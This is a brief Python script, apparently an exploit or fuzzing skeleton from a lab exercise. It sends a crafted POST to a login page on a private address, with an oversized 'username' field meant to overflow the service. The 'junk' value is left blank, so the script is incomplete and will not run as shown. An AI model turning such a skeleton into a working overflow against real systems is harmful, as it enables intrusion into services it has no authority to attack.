#!/usr/bin/python
import socket


junk =

payload="username="+junk+"&password=A"

buffer="POST /login HTTP/1.1\r\n"
buffer+="Host: 192.168.129.128\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
buffer+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buffer+="Accept-Language: en-US,en;q=0.5\r\n"
buffer+="Referer: http://192.168.129.128/login\r\n"
buffer+="Connection: close\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="Content-Length: "+str(len(payload))+"\r\n"
buffer+="\r\n"
buffer+=payload

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.129.128", 80))
s.send(buffer)
s.close()
